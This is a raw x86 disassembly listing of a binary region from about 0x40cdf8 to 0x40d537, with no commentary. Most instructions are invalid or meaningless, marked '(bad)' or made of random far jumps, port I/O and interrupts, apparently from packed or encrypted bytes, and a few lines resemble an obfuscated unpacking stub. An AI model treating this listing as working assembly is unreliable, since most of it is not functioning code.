  40cdf8:	mov    ebp,DWORD PTR [edx-0x78]
  40cdfb:	xchg   ecx,eax
  40cdfc:	ret    0xd59c
  40cdff:	jmp    0xc46b:0xc14cb0e2
  40ce06:	jbe    0x40ce80
  40ce08:	xor    al,0x34
  40ce0a:	pushf  
  40ce0b:	je     0x40cdd8
  40ce0d:	sub    al,0x47
  40ce0f:	pushf  
  40ce10:	add    al,0xcb
  40ce12:	mul    DWORD PTR [ebp+eiz*4-0x69]
  40ce16:	cmp    al,0x22
  40ce18:	les    esi,FWORD PTR [esp+eax*8-0x37]
  40ce1c:	fdiv   QWORD PTR [eax]
  40ce1e:	and    al,0xf5
  40ce20:	jae    0x40cdcb
  40ce22:	xchg   BYTE PTR [edi],cl
  40ce24:	rcr    esp,cl
  40ce26:	push   eax
  40ce27:	(bad)  
  40ce28:	lods   al,BYTE PTR ds:[esi]
  40ce29:	in     al,dx
  40ce2a:	fwait
  40ce2b:	push   eax
  40ce2c:	jbe    0x40ce80
  40ce2e:	pushf  
  40ce2f:	xor    cl,BYTE PTR [esi-0x36a42a4b]
  40ce35:	cmp    BYTE PTR [esi-0x1eb97264],0x6d
  40ce3c:	mov    BYTE PTR [edi+0x5224f40f],bh
  40ce42:	dec    esp
  40ce43:	jnp    0x40ce87
  40ce45:	loope  0x40ce4d
  40ce47:	inc    eax
  40ce48:	data16 aad 0x1d
  40ce4b:	lahf   
  40ce4c:	adc    bl,bl
  40ce4e:	lock sub eax,0xd3346352
  40ce54:	std    
  40ce55:	xor    BYTE PTR [edx],bl
  40ce57:	popf   
  40ce58:	rol    BYTE PTR [eax],cl
  40ce5a:	push   eax
  40ce5b:	jecxz  0x40cedc
  40ce5d:	stos   BYTE PTR es:[edi],al
  40ce5e:	jmp    0xefd28958
  40ce63:	(bad)  
  40ce64:	sub    eax,0x62136b93
  40ce69:	outs   dx,BYTE PTR ds:[esi]
  40ce6a:	add    eax,0x89817e92
  40ce6f:	call   DWORD PTR [ebp+ebp*2-0x30]
  40ce73:	out    dx,eax
  40ce74:	mov    ebx,0xa9268fd1
  40ce79:	mov    eax,0x4501fe97
  40ce7e:	gs icebp 
  40ce80:	test   BYTE PTR [eax],0xe
  40ce83:	fistp  QWORD PTR [eax-0x41]
  40ce86:	cmp    ecx,DWORD PTR [ecx+0x5b0c4bb0]
  40ce8c:	adc    ah,0x4f
  40ce8f:	fwait
  40ce90:	and    esi,ecx
  40ce92:	jb     0x40ce78
  40ce94:	pop    ss
  40ce95:	mov    ecx,DWORD PTR [edi+ecx*1]
  40ce98:	aam    0x27
  40ce9a:	adc    ebp,DWORD PTR [esp+ebp*1]
  40ce9d:	(bad)  
  40ce9e:	(bad)  
  40ce9f:	sbb    al,0x90
  40cea1:	or     bh,BYTE PTR [edx]
  40cea3:	imul   ebp,ecx,0x18
  40cea6:	jmp    0x2f69bc06
  40ceab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceac:	or     bh,ch
  40ceae:	cmp    DWORD PTR [ebx-0x80],edi
  40ceb1:	pop    ecx
  40ceb2:	dec    edi
  40ceb3:	xchg   esp,eax
  40ceb4:	jnp    0x40cf17
  40ceb6:	outs   dx,BYTE PTR ds:[esi]
  40ceb7:	push   eax
  40ceb8:	mov    WORD PTR [edi+esi*4-0x15],?
  40cebc:	enter  0x8072,0x43
  40cec0:	outs   dx,BYTE PTR ds:[esi]
  40cec1:	outs   dx,DWORD PTR ds:[esi]
  40cec2:	adc    ebp,DWORD PTR [eax+0x65]
  40cec5:	and    al,0xfd
  40cec7:	rcr    edi,0xd7
  40ceca:	int    0x39
  40cecc:	sbb    DWORD PTR [ebx-0x3c],edi
  40cecf:	enter  0x1278,0x29
  40ced3:	out    dx,al
  40ced4:	pop    ebp
  40ced5:	lea    edi,[ebx]
  40ced7:	cmp    edx,DWORD PTR [ebp-0x48]
  40ceda:	adc    DWORD PTR [ebp-0x22],esp
  40cedd:	das    
  40cede:	add    ah,dh
  40cee0:	and    dh,dl
  40cee2:	add    eax,0x815f8a7b
  40cee7:	inc    edx
  40cee8:	push   ebx
  40cee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceea:	pop    es
  40ceeb:	rol    ah,cl
  40ceed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceee:	clc    
  40ceef:	mov    esi,0x5688c14a
  40cef4:	pop    edx
  40cef5:	rol    DWORD PTR [esi+0x7f5997dd],1
  40cefb:	lahf   
  40cefc:	pop    es
  40cefd:	jne    0x40ceaf
  40ceff:	adc    BYTE PTR [esi+0x7],al
  40cf02:	cli    
  40cf03:	or     al,BYTE PTR [ebp+0x14e1ae14]
  40cf09:	push   es
  40cf0a:	xchg   BYTE PTR [ecx],bl
  40cf0c:	ret    
  40cf0d:	aas    
  40cf0e:	das    
  40cf0f:	stos   DWORD PTR es:[edi],eax
  40cf10:	mov    ch,0x5d
  40cf12:	jecxz  0x40cf0a
  40cf14:	sub    al,0xeb
  40cf16:	mov    BYTE PTR [esi+0x38b625b1],0xc8
  40cf1d:	in     eax,0x17
  40cf1f:	ins    BYTE PTR es:[edi],dx
  40cf20:	jl     0x40ceff
  40cf22:	mov    bh,0x6
  40cf24:	or     eax,DWORD PTR [esi+eax*4]
  40cf27:	cli    
  40cf28:	sbb    BYTE PTR [edx-0x64],bh
  40cf2b:	mov    al,0x69
  40cf2d:	bound  ebx,QWORD PTR [ebx+eiz*2+0x24]
  40cf31:	mov    ds:0x689c78cc,al
  40cf36:	sub    eax,0x8835fed4
  40cf3b:	sub    BYTE PTR [ebx+ebx*8+0x77ff82db],ch
  40cf42:	jns    0x40cf1d
  40cf44:	dec    ebp
  40cf45:	sar    DWORD PTR [ebp+0x5cbd507c],0xc3
  40cf4c:	das    
  40cf4d:	test   al,0x9e
  40cf4f:	enter  0xd479,0x5b
  40cf53:	nop
  40cf54:	jg     0x40cee1
  40cf56:	clc    
  40cf57:	cmp    ecx,ebp
  40cf59:	and    BYTE PTR [edx-0x2d],al
  40cf5c:	adc    ah,dl
  40cf5e:	sbb    edi,DWORD PTR [ecx-0x27]
  40cf61:	ja     0x40cfc8
  40cf63:	mov    ebp,fs
  40cf65:	mov    DWORD PTR [ebp-0x12],edi
  40cf68:	jmp    0x40cfa2
  40cf6a:	test   al,0xeb
  40cf6c:	adc    esp,DWORD PTR [ecx]
  40cf6e:	pop    ecx
  40cf6f:	push   edx
  40cf70:	(bad)  
  40cf71:	dec    edi
  40cf72:	push   ebx
  40cf73:	add    eax,0x5265b886
  40cf78:	add    BYTE PTR [edx+0x53],cl
  40cf7b:	not    BYTE PTR [ebx]
  40cf7d:	inc    edi
  40cf7e:	push   ds
  40cf7f:	mov    ch,BYTE PTR [ecx+0x469130c0]
  40cf85:	imul   DWORD PTR [edx-0x3a]
  40cf88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf89:	cs ins DWORD PTR es:[edi],dx
  40cf8b:	(bad)  ds:0x5d79a307
  40cf91:	xchg   esi,eax
  40cf92:	out    dx,eax
  40cf93:	inc    esp
  40cf94:	mov    ah,0xb1
  40cf96:	mov    ah,0x29
  40cf98:	mov    al,ds:0xa563e355
  40cf9d:	data16 cs loopne 0x40d002
  40cfa1:	fwait
  40cfa2:	daa    
  40cfa3:	fwait
  40cfa4:	ret    
  40cfa5:	imul   ebp,DWORD PTR ds:0x40b66297,0x3d
  40cfac:	jne    0x40cfb4
  40cfae:	(bad)  
  40cfaf:	adc    cl,BYTE PTR [eax+0x2]
  40cfb2:	fisubr DWORD PTR [ebp+0x3592039d]
  40cfb8:	xchg   esi,eax
  40cfb9:	fst    DWORD PTR [ebx+edx*2+0x140a7941]
  40cfc0:	imul   edi,DWORD PTR [edx],0x4e3372fe
  40cfc6:	out    0x5f,eax
  40cfc8:	pop    ss
  40cfc9:	inc    edi
  40cfca:	mov    bl,cl
  40cfcc:	sub    edx,DWORD PTR [eax-0x5538c36]
  40cfd2:	add    edi,edx
  40cfd4:	(bad)  
  40cfd5:	aaa    
  40cfd6:	(bad)  
  40cfd7:	cmp    esp,DWORD PTR [ebp+0x1a]
  40cfda:	int    0xe0
  40cfdc:	cs push 0xc8699968
  40cfe2:	fldcw  WORD PTR [esi+0x6b]
  40cfe5:	shl    cl,cl
  40cfe7:	push   ds
  40cfe8:	push   ds
  40cfe9:	mov    cs,WORD PTR [edx-0x366f1857]
  40cfef:	icebp  
  40cff0:	push   esi
  40cff1:	rcl    esi,cl
  40cff3:	int    0x97
  40cff5:	jbe    0x40cfb5
  40cff7:	mul    ah
  40cff9:	je     0x40cfcc
  40cffb:	je     0x40d00b
  40cffd:	retf   
  40cffe:	xchg   edi,eax
  40cfff:	call   0xed441c6a
  40d004:	lods   eax,DWORD PTR ds:[esi]
  40d005:	mov    cl,0xc9
  40d007:	outs   dx,BYTE PTR ds:[esi]
  40d008:	add    eax,0x8828bfa9
  40d00d:	ret    0x8fa8
  40d010:	popa   
  40d011:	mov    al,0x4e
  40d013:	mov    ebx,0xdc76aa8b
  40d018:	jl     0x40d031
  40d01a:	(bad)  
  40d01b:	cmp    cl,dh
  40d01d:	dec    ebx
  40d01e:	mov    eax,0xe6a579ff
  40d023:	pusha  
  40d024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d025:	popf   
  40d026:	(bad)  
  40d027:	in     al,dx
  40d028:	add    DWORD PTR [ecx-0x79],0x993b506a
  40d02f:	js     0x40d05e
  40d031:	popa   
  40d032:	sub    DWORD PTR [ebx-0x9e6dd19],ebx
  40d038:	sub    ebp,DWORD PTR [edi]
  40d03a:	xchg   esi,eax
  40d03b:	mov    WORD PTR [ecx+0x5c],ss
  40d03e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d03f:	or     eax,0x46e8e2e9
  40d044:	mov    ebp,0x71b25040
  40d049:	mov    BYTE PTR [eax+0x78],0xa6
  40d04d:	fisubr DWORD PTR [eax+0x61]
  40d050:	sbb    al,0x7
  40d052:	cmp    bl,BYTE PTR [eax+eiz*4+0x44]
  40d056:	fimul  DWORD PTR [ebx]
  40d058:	sbb    DWORD PTR [ebx+0x77],esi
  40d05b:	xor    BYTE PTR [esi-0x5c6b61b],dh
  40d061:	stos   DWORD PTR es:[edi],eax
  40d062:	dec    edi
  40d063:	dec    edx
  40d064:	inc    edx
  40d065:	xchg   BYTE PTR [ecx+eiz*2-0x48],ch
  40d069:	push   es
  40d06a:	mov    esi,0x775221fb
  40d06f:	add    al,0x1e
  40d071:	push   ecx
  40d072:	cmp    eax,0x299b3fb4
  40d077:	mov    ds:0xebce9b31,al
  40d07c:	fild   DWORD PTR [ebp+0x6c]
  40d07f:	mov    al,0x8a
  40d081:	mov    esi,0xb0a375c3
  40d086:	sub    al,0x70
  40d088:	sti    
  40d089:	je     0x40d057
  40d08b:	mov    ah,0x8
  40d08d:	and    al,0xb4
  40d08f:	mov    edi,0x569cbac6
  40d094:	mov    eax,ds:0x9988d74b
  40d099:	lds    esp,FWORD PTR [esi+0x5b05de6d]
  40d09f:	and    ecx,DWORD PTR [ecx+0x65b34945]
  40d0a5:	add    eax,0xd668ccd8
  40d0aa:	(bad)  
  40d0ab:	push   ds
  40d0ac:	js     0x40d096
  40d0ae:	pop    ss
  40d0af:	(bad)  
  40d0b0:	std    
  40d0b1:	adc    edi,DWORD PTR [edx]
  40d0b3:	xor    eax,0x43086192
  40d0b8:	repz or eax,0xb3c0e46a
  40d0be:	ds call 0xdcd9:0x5dc8f0d0
  40d0c6:	pop    ebx
  40d0c7:	ret    
  40d0c8:	lods   eax,DWORD PTR ds:[esi]
  40d0c9:	adc    BYTE PTR [edi+eax*8],dl
  40d0cc:	dec    ebp
  40d0cd:	fsub   st,st(0)
  40d0cf:	daa    
  40d0d0:	xchg   edi,eax
  40d0d1:	or     edi,ecx
  40d0d3:	outs   dx,BYTE PTR ds:[esi]
  40d0d4:	cmp    dl,BYTE PTR [eax+eax*2+0xa7b71fc]
  40d0db:	adc    al,0xf9
  40d0dd:	inc    esp
  40d0de:	adc    eax,0x8988d62e
  40d0e3:	adc    dh,BYTE PTR [ebx-0x3efa3445]
  40d0e9:	popa   
  40d0ea:	enter  0xa883,0x16
  40d0ee:	xchg   ecx,eax
  40d0ef:	jns    0x40d0bc
  40d0f1:	mov    ecx,0x693f0014
  40d0f6:	pop    eax
  40d0f7:	push   ecx
  40d0f8:	jbe    0x40d0ef
  40d0fa:	sub    eax,edi
  40d0fc:	lea    ebx,[eax]
  40d0fe:	scas   al,BYTE PTR es:[edi]
  40d0ff:	je     0x40d0ad
  40d101:	push   0x15bfb915
  40d106:	and    al,cl
  40d108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d109:	pop    ecx
  40d10a:	mov    DWORD PTR [ecx],0xacc216cc
  40d110:	xchg   esp,eax
  40d111:	push   esi
  40d112:	outs   dx,BYTE PTR ds:[esi]
  40d113:	or     ah,cl
  40d115:	int3   
  40d116:	stc    
  40d117:	or     BYTE PTR [ecx-0x11],ch
  40d11a:	inc    edi
  40d11b:	inc    esi
  40d11c:	es xor esp,esi
  40d11f:	jnp    0x40d110
  40d121:	cli    
  40d122:	or     esp,ebx
  40d124:	call   0x597d:0x1bda79d7
  40d12b:	aaa    
  40d12c:	mov    eax,ds:0xcfa52688
  40d131:	retf   
  40d132:	push   eax
  40d133:	push   edx
  40d134:	adc    dl,ah
  40d136:	call   0x4c8c:0x8450f1b2
  40d13d:	push   eax
  40d13e:	pop    DWORD PTR [edx+0x5c]
  40d141:	retf   
  40d142:	push   esp
  40d143:	or     edi,ebp
  40d145:	push   ds
  40d146:	push   ss
  40d147:	add    BYTE PTR [ebx],cl
  40d149:	dec    eax
  40d14a:	je     0x40d169
  40d14c:	jo     0x40d131
  40d14e:	es cmp al,0xda
  40d151:	mov    ebp,0xc7499acb
  40d156:	cdq    
  40d157:	push   dx
  40d159:	call   0x1f7e32a3
  40d15e:	xchg   ebp,eax
  40d15f:	jg     0x40d146
  40d161:	(bad)  
  40d162:	fnstsw WORD PTR [ecx-0x7b]
  40d165:	mov    ecx,0x3a83d64
  40d16a:	xchg   ecx,eax
  40d16b:	lods   al,BYTE PTR ds:[esi]
  40d16c:	adc    al,0x59
  40d16e:	mov    esi,0xf863e379
  40d173:	dec    ecx
  40d174:	test   eax,0x2c88fb62
  40d179:	and    DWORD PTR [edx-0x3f],ecx
  40d17c:	aam    0x3
  40d17e:	mov    fs,WORD PTR [eax+0x36]
  40d181:	nop
  40d182:	add    cl,dl
  40d184:	xchg   ecx,eax
  40d185:	ins    DWORD PTR es:[edi],dx
  40d186:	dec    edi
  40d187:	scas   eax,DWORD PTR es:[edi]
  40d188:	fwait
  40d189:	jle    0x40d122
  40d18b:	add    eax,0xef2d3162
  40d190:	fs lock mov bl,0x5f
  40d194:	pop    ecx
  40d195:	into   
  40d196:	ret    
  40d197:	in     eax,dx
  40d198:	retf   
  40d199:	inc    ebx
  40d19a:	scas   al,BYTE PTR es:[edi]
  40d19b:	mov    ebx,0x2c40d7d7
  40d1a0:	jmp    0x5bb31cd2
  40d1a5:	(bad)  
  40d1a6:	je     0x40d1c4
  40d1a8:	ror    BYTE PTR [ebx-0x3b],cl
  40d1ab:	adc    ch,BYTE PTR [esi]
  40d1ad:	push   edx
  40d1ae:	sbb    BYTE PTR [ebx],al
  40d1b0:	add    BYTE PTR [ebp+0x7af0c140],ch
  40d1b6:	icebp  
  40d1b7:	lahf   
  40d1b8:	fistp  WORD PTR [edx+ecx*4-0x1c]
  40d1bc:	loop   0x40d1f3
  40d1be:	pop    es
  40d1bf:	adc    esp,edx
  40d1c1:	xchg   ebp,eax
  40d1c2:	jl     0x40d1a5
  40d1c4:	std    
  40d1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1c6:	adc    BYTE PTR [eax],0x0
  40d1c9:	enter  0x4e58,0x87
  40d1cd:	pop    es
  40d1ce:	pop    ebx
  40d1cf:	adc    eax,0xd24a633e
  40d1d4:	dec    edx
  40d1d5:	fnstsw WORD PTR [eax+ecx*1+0x3f]
  40d1d9:	push   eax
  40d1da:	iret   
  40d1db:	loop   0x40d1b2
  40d1dd:	iret   
  40d1de:	rcr    BYTE PTR [ebx-0x7e],1
  40d1e1:	jmp    0xc8ba:0x4f42244f
  40d1e8:	or     BYTE PTR [ebx+eiz*4],0x98
  40d1ec:	xchg   esp,eax
  40d1ed:	cmp    al,0xfd
  40d1ef:	sub    eax,0x8ddcb1a7
  40d1f4:	jmp    0xc1f8:0xaf4d528
  40d1fb:	inc    edx
  40d1fc:	xchg   edx,eax
  40d1fd:	push   eax
  40d1fe:	mov    al,ds:0x58892b57
  40d203:	inc    edx
  40d204:	ret    0x16a9
  40d207:	cmp    DWORD PTR [eax+0xc],esi
  40d20a:	stos   DWORD PTR es:[edi],eax
  40d20b:	push   cs
  40d20c:	xchg   esi,eax
  40d20d:	(bad)  
  40d20e:	mov    eax,0x9f1dc7a5
  40d213:	jae    0x40d19e
  40d215:	mov    ecx,0xeaa3f6c2
  40d21a:	jbe    0x40d262
  40d21c:	cwde   
  40d21d:	mov    ?,WORD PTR [edx+0x790b3c6c]
  40d223:	data16 out dx,al
  40d225:	xor    al,ah
  40d227:	mov    ds:0x6ffdbbaf,al
  40d22c:	clc    
  40d22d:	push   edi
  40d22e:	push   es
  40d22f:	dec    esp
  40d230:	ins    BYTE PTR es:[edi],dx
  40d231:	adc    eax,0xeb383bd0
  40d236:	je     0x40d1e9
  40d238:	rcl    BYTE PTR [edx+ebp*8],cl
  40d23b:	arpl   WORD PTR [edi+0x4e315609],bx
  40d241:	repnz int 0xbe
  40d244:	inc    edi
  40d245:	xlat   BYTE PTR ds:[ebx]
  40d246:	fs mov cl,0xbe
  40d249:	in     eax,0xd
  40d24b:	mov    ah,0x62
  40d24d:	bound  edi,QWORD PTR [ebp+edx*2-0x7cf6b1f]
  40d254:	mov    cl,BYTE PTR [ecx+0x351f18b8]
  40d25a:	push   ss
  40d25b:	cmp    ah,bh
  40d25d:	in     al,dx
  40d25e:	xor    al,0x83
  40d260:	jl     0x40d246
  40d262:	sub    dh,BYTE PTR [ebx+ecx*2+0x5b]
  40d266:	xchg   DWORD PTR [edi-0x3c86a71f],ebp
  40d26c:	cmp    edi,DWORD PTR [ebp+0x3e]
  40d26f:	sahf   
  40d270:	sub    eax,0x8c8d5b8e
  40d275:	adc    eax,edi
  40d277:	jb     0x40d2ab
  40d279:	add    BYTE PTR [ebx],bh
  40d27b:	enter  0x850f,0x60
  40d27f:	mov    eax,0x458bffff
  40d284:	cld    
  40d285:	xor    eax,esi
  40d287:	add    eax,edi
  40d289:	mov    DWORD PTR [ebp-0x10],eax
  40d28c:	mov    ebx,0x756654
  40d291:	add    ebx,0x567645
  40d297:	jmp    0x40f637
  40d29c:	iret   
  40d29d:	jmp    0x40d284
  40d29f:	sub    cl,0x9a
  40d2a2:	cli    
  40d2a3:	in     al,dx
  40d2a4:	xchg   ebx,eax
  40d2a5:	sbb    al,0x4b
  40d2a7:	or     bl,BYTE PTR [ebx]
  40d2a9:	and    eax,0x2b2fd251
  40d2ae:	jnp    0x40d32b
  40d2b0:	(bad)  
  40d2b1:	sahf   
  40d2b2:	jnp    0x40d32f
  40d2b4:	dec    ebx
  40d2b5:	sub    ebx,esp
  40d2b7:	lds    ebx,FWORD PTR [ebp-0x497e7a59]
  40d2bd:	leave  
  40d2be:	xchg   ebp,eax
  40d2bf:	push   es
  40d2c0:	pop    esi
  40d2c1:	add    al,0x7e
  40d2c3:	mov    BYTE PTR [edx-0x3],bh
  40d2c6:	lock inc eax
  40d2c8:	and    DWORD PTR ds:[ebx+0x2cd35c21],0x1a
  40d2d0:	push   es
  40d2d1:	popa   
  40d2d2:	cli    
  40d2d3:	cmp    eax,0xf0b936bf
  40d2d8:	jmp    0xf1c550e9
  40d2dd:	jo     0x40d29a
  40d2df:	imul   eax,esp,0xffffffea
  40d2e2:	outs   dx,DWORD PTR ds:[esi]
  40d2e3:	outs   dx,BYTE PTR ds:[esi]
  40d2e4:	(bad)  [esi]
  40d2e6:	mov    esi,0xc81a1aed
  40d2eb:	jne    0x40d2c9
  40d2ed:	nop
  40d2ee:	dec    ebx
  40d2ef:	and    eax,eax
  40d2f1:	clc    
  40d2f2:	sub    BYTE PTR [edi+edi*1-0x7c02d035],bh
  40d2f9:	dec    esi
  40d2fa:	push   esi
  40d2fb:	mov    BYTE PTR [edi],al
  40d2fd:	xchg   ebx,eax
  40d2fe:	icebp  
  40d2ff:	repz mov ebp,DWORD PTR ss:[ecx+0x6c02edb8]
  40d307:	leave  
  40d308:	mov    ch,0x6e
  40d30a:	xchg   edx,eax
  40d30b:	xchg   edi,eax
  40d30c:	dec    ebx
  40d30d:	or     BYTE PTR [edi],ah
  40d30f:	pop    edx
  40d310:	adc    eax,DWORD PTR [edx]
  40d312:	mov    ecx,ebp
  40d314:	mov    ecx,0x10d5d88f
  40d319:	dec    edx
  40d31a:	out    0x7d,al
  40d31c:	enter  0x8b3f,0xe0
  40d320:	(bad)  
  40d321:	shl    DWORD PTR [ecx+edx*4-0x6f],cl
  40d325:	repnz aam 0x4d
  40d328:	dec    eax
  40d329:	push   edi
  40d32a:	xchg   edx,eax
  40d32b:	inc    ebx
  40d32c:	xchg   BYTE PTR [esi],cl
  40d32e:	gs sahf 
  40d330:	push   cs
  40d331:	xor    bh,ah
  40d333:	fwait
  40d334:	das    
  40d335:	mov    eax,ds:0x38647918
  40d33a:	push   ebp
  40d33b:	jle    0x40d36e
  40d33d:	mov    bh,0xbd
  40d33f:	test   al,0xb2
  40d341:	cli    
  40d342:	pop    esp
  40d343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d344:	mov    edx,0xacaefb18
  40d349:	cmp    BYTE PTR [esi],dl
  40d34b:	mov    cl,0x90
  40d34d:	or     al,0xe8
  40d34f:	mov    eax,ds:0x22a152a5
  40d354:	mov    al,0xc1
  40d356:	rcr    DWORD PTR [edi-0x35],0x39
  40d35a:	mov    cl,BYTE PTR [ecx]
  40d35c:	rol    DWORD PTR [ebx+0x7324ad7a],0xe6
  40d363:	pop    es
  40d364:	lds    edx,FWORD PTR [esi+ebp*4+0x68]
  40d368:	and    dl,BYTE PTR [ecx-0x48]
  40d36b:	jb     0x40d2f3
  40d36d:	je     0x40d3d2
  40d36f:	pop    edx
  40d370:	(bad)  
  40d372:	in     al,dx
  40d373:	push   esi
  40d374:	into   
  40d375:	xchg   DWORD PTR [edi],edx
  40d377:	pop    ebx
  40d378:	mul    BYTE PTR [ebp-0x2cadb3cc]
  40d37e:	inc    BYTE PTR [ecx-0x4b]
  40d381:	je     0x40d345
  40d383:	test   al,0x95
  40d385:	add    eax,0x31c6f0da
  40d38a:	(bad)  
  40d38b:	sub    cl,dl
  40d38d:	add    ecx,ebp
  40d38f:	jae    0x40d331
  40d391:	ror    BYTE PTR [ebx+0x5a],1
  40d394:	jo     0x40d32b
  40d396:	test   DWORD PTR [ecx],ebp
  40d398:	aad    0xf2
  40d39a:	ins    DWORD PTR es:[edi],dx
  40d39b:	(bad)  
  40d39c:	outs   dx,BYTE PTR ds:[esi]
  40d39d:	pop    ds
  40d39e:	add    dl,BYTE PTR [ecx+esi*4-0x187c2a21]
  40d3a5:	jmp    0x301c:0xe3031219
  40d3ac:	iret   
  40d3ad:	xchg   esi,eax
  40d3ae:	loope  0x40d3b2
  40d3b0:	sbb    BYTE PTR [ebx-0x61918957],0xce
  40d3b7:	(bad)  
  40d3b8:	jnp    0x40d382
  40d3ba:	or     al,0xb5
  40d3bc:	xchg   ebp,eax
  40d3bd:	and    ebx,DWORD PTR [eax-0x71]
  40d3c0:	fdiv   DWORD PTR ds:0x2e42ac89
  40d3c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c7:	aaa    
  40d3c8:	mov    ds:0x23d9fe79,eax
  40d3cd:	hlt    
  40d3ce:	mov    al,ds:0x8d5d6686
  40d3d3:	icebp  
  40d3d4:	mov    dl,0x88
  40d3d6:	jne    0x40d3f0
  40d3d8:	jl     0x40d3cf
  40d3da:	sub    BYTE PTR [edi+edi*1],bh
  40d3dd:	ins    BYTE PTR es:[edi],dx
  40d3de:	jnp    0x40d415
  40d3e0:	push   cs
  40d3e1:	cmp    al,0xac
  40d3e3:	xchg   ebx,eax
  40d3e4:	xchg   ecx,eax
  40d3e5:	iret   
  40d3e6:	ffree  st(5)
  40d3e8:	arpl   WORD PTR [ebx+0x15],sp
  40d3eb:	pop    eax
  40d3ec:	add    DWORD PTR [ecx],esi
  40d3ee:	cwde   
  40d3ef:	add    eax,0x84ce449e
  40d3f4:	push   ebx
  40d3f5:	xchg   edx,eax
  40d3f6:	dec    ebp
  40d3f7:	inc    eax
  40d3f8:	in     eax,0xc0
  40d3fa:	scas   eax,DWORD PTR es:[edi]
  40d3fb:	jbe    0x40d3f1
  40d3fd:	mov    esp,0x6984d530
  40d402:	cld    
  40d403:	clc    
  40d404:	mov    edx,0x65331738
  40d409:	shl    DWORD PTR [ecx-0x74dd171d],0xac
  40d410:	shr    BYTE PTR [eax-0x28e26dc8],cl
  40d416:	adc    al,0xda
  40d418:	int3   
  40d419:	sub    BYTE PTR [ecx+eax*1-0x33ad878f],ch
  40d420:	and    BYTE PTR [eax+0x2c9a3409],ch
  40d426:	dec    esp
  40d427:	and    BYTE PTR [esi-0x1e32f72c],0xad
  40d42e:	add    DWORD PTR [edx+eiz*4],0xffffffba
  40d432:	rcl    edx,1
  40d434:	inc    edx
  40d435:	push   edx
  40d436:	mov    al,ds:0xc0ef7330
  40d43b:	fsub   DWORD PTR [eax-0x5329d184]
  40d441:	pop    esp
  40d442:	adc    al,0x98
  40d444:	stos   BYTE PTR es:[edi],al
  40d445:	bswap  ebx
  40d447:	addr16 jg 0x40d3d4
  40d44a:	mov    dl,0x19
  40d44c:	icebp  
  40d44d:	push   0xaeb56ae4
  40d452:	mov    ds:0x23963ab3,eax
  40d457:	push   ecx
  40d458:	in     al,dx
  40d459:	popa   
  40d45a:	jae    0x40d4bb
  40d45c:	sub    edx,DWORD PTR [edx+eiz*2+0x17]
  40d460:	sub    eax,DWORD PTR [ebx]
  40d462:	push   ecx
  40d463:	sub    eax,0x3d218369
  40d468:	xor    ecx,esi
  40d46a:	in     eax,0xeb
  40d46c:	call   0xdb8f:0xb0cc1f8c
  40d473:	stc    
  40d474:	push   ecx
  40d475:	mov    dh,0xeb
  40d477:	out    0xbf,eax
  40d479:	push   ss
  40d47a:	push   esi
  40d47b:	das    
  40d47c:	jb     0x40d4d7
  40d47e:	sub    al,0x67
  40d480:	jae    0x40d411
  40d482:	aas    
  40d483:	dec    ecx
  40d484:	loopne 0x40d4fa
  40d486:	bound  eax,QWORD PTR [edi]
  40d488:	sbb    al,0xfc
  40d48a:	add    DWORD PTR [esi],eax
  40d48c:	mov    WORD PTR [edi+0x70],?
  40d48f:	adc    BYTE PTR [edi],bh
  40d491:	xchg   BYTE PTR [ebx],dl
  40d493:	jae    0x40d421
  40d495:	out    dx,al
  40d496:	push   ds
  40d497:	(bad)  
  40d498:	and    eax,0x1153f635
  40d49d:	shl    edx,0x4
  40d4a0:	ror    DWORD PTR [edi+0x5005ce7d],cl
  40d4a6:	and    edx,DWORD PTR [esi+ecx*1-0x12acf223]
  40d4ad:	sub    bl,BYTE PTR [ebx-0x1364b9e5]
  40d4b3:	scas   eax,DWORD PTR es:[edi]
  40d4b4:	add    al,0xd0
  40d4b6:	cli    
  40d4b7:	popa   
  40d4b8:	mov    edx,0x88007252
  40d4bd:	inc    edi
  40d4be:	sbb    DWORD PTR [edx],ecx
  40d4c0:	and    DWORD PTR [ecx-0x5782030a],eax
  40d4c6:	addr16 jle 0x40d4d5
  40d4c9:	std    
  40d4ca:	rcr    dh,0x27
  40d4cd:	pop    edx
  40d4ce:	fwait
  40d4cf:	xor    edx,DWORD PTR [edi-0x62]
  40d4d2:	data16 daa 
  40d4d4:	jo     0x40d4ae
  40d4d6:	or     al,0xc8
  40d4d8:	lods   al,BYTE PTR ds:[esi]
  40d4d9:	stos   BYTE PTR es:[edi],al
  40d4da:	jecxz  0x40d479
  40d4dc:	push   ds
  40d4dd:	les    ebp,FWORD PTR [eax+0x27]
  40d4e0:	mov    ds:0xc6abee65,al
  40d4e5:	sub    BYTE PTR [edi+0x3867638d],dl
  40d4eb:	imul   ecx,ebx,0x4915d89f
  40d4f1:	mov    ch,0x49
  40d4f3:	lock cmp dh,BYTE PTR [esi]
  40d4f6:	mov    edi,0x835ee2c7
  40d4fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4fc:	cli    
  40d4fd:	push   eax
  40d4fe:	xchg   ebp,eax
  40d4ff:	jne    0x40d577
  40d501:	ins    DWORD PTR es:[edi],dx
  40d502:	bound  eax,QWORD PTR [edi-0x18]
  40d505:	int3   
  40d506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d507:	and    cl,BYTE PTR [edi+0x110a3b83]
  40d50d:	inc    ebx
  40d50e:	xchg   ecx,eax
  40d50f:	mov    DWORD PTR [ebp+0x24],0xcb365da0
  40d516:	mov    WORD PTR [edx-0x34],ss
  40d519:	push   ecx
  40d51a:	call   0x9fe3caa4
  40d51f:	fld    QWORD PTR [edx+ecx*8+0x28]
  40d523:	cmp    al,0xed
  40d525:	mov    DWORD PTR ds:0xe7bc95c8,ebp
  40d52b:	mov    ah,0x57
  40d52d:	sub    bl,BYTE PTR [edi-0x74]
  40d530:	loop   0x40d52b
  40d532:	mov    ah,0x43
  40d534:	in     al,0xa5
  40d536:	retf   
  40d537:	outs   dx,DWORD PTR ds:[esi]
